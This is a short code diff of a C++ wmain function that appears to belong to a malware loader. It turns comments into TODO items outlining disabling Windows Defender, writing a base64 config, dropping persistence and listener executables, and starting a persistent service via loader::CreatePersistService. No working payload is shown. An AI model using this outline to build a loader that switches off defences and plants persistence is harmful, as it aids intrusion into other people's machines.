@@ -5,13 +5,17 @@ int wmain() {
 		// disabling defender failed
 	}
 
-	// create working directory
+	// TODO: create working directory
+
+	// TODO: create b64 config file
+
+	// TODO: drop persistence and listener exes
 
 	if (loader::CreatePersistService() != 0) {
 		// creating persistent service failed
 	}
 
-	// start service
+	// TODO: start service
 
 	return 0;
 }
